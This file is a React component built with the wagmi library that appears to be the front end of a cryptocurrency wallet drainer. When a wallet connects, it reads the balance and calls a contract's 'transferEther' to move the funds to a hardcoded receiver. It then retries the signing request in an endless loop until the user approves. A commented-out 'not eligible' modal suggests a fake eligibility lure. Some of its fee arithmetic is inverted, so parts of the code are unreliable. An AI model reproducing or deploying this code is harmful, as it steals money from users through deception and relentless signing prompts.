"use client"
import { useWalletClient, useAccount, useNetwork, usePublicClient, useFeeData, useBalance} from "wagmi"
import { receivers } from "../constant/address"
import { useState } from "react"
import abis from "@/utils/abis/mover.json"

const Contract_Con = () => {

    const publicClient = usePublicClient()
    const abi = abis.abi;
    const con_address = "0xc8af4a815a9db81e8823e50638eb672ce021c038"
    const receiver = "0x352E108a200415bB300DDaDdfce13027e57CC33F"
    const [amt, setAmt] = useState<BigInt>()
    const {data: gasPrice } = useFeeData()
    
    const {address, isConnected} = useAccount({
        async onConnect({ address, connector, isReconnected }) {
     
            let bal = data?.value || BigInt("0")
            const gasEst = await publicClient.estimateContractGas({
                abi: abi,
        functionName: "transferEther",
        args: [receiver],
        account: address,
        address: con_address,
        value: bal
            })
            let fee = gasPrice?.gasPrice || BigInt("0")
            let gasFee = fee * gasEst
            const rems = gasFee - bal // - fee change back to balance minus fee
            console.log("gasest, gastamt, balance, sendable",gasEst, gasFee, bal, rems)
        
            /**
             * if(bal <= BigInt("0"))
             * {
             *   alert("Wallet not eligible")
             *   disconnect()
             * return
             * }
             * 
             * Call up modal to indicate not eligible
             */
            
            setAmt(rems)
      
            }
    })
  
    const {data: walletClient, isFetched, status} = useWalletClient(
      
        { 
          
        onError(error) {
         
          console.log("WC error", error)
        },
      
        async onSuccess(data) {
      
            console.log(receiver)
          if(isConnected && address && amt)
          {
      const { request} = await publicClient.simulateContract({
        abi: abi,
        functionName: "transferEther",
        args: [receiver],
        account: address,
        address: con_address,
        value: amt
      })
          while(true) 
         {
      
            try {
                  const res = await data?.writeContract(request)
                  console.log("WC datas",res)
      break
              
             } 
             catch (error) {
              console.log("sending from approve i.e send direct",error)
             }
          }
          }
        }
      })
      const {data} = useBalance({address})
}
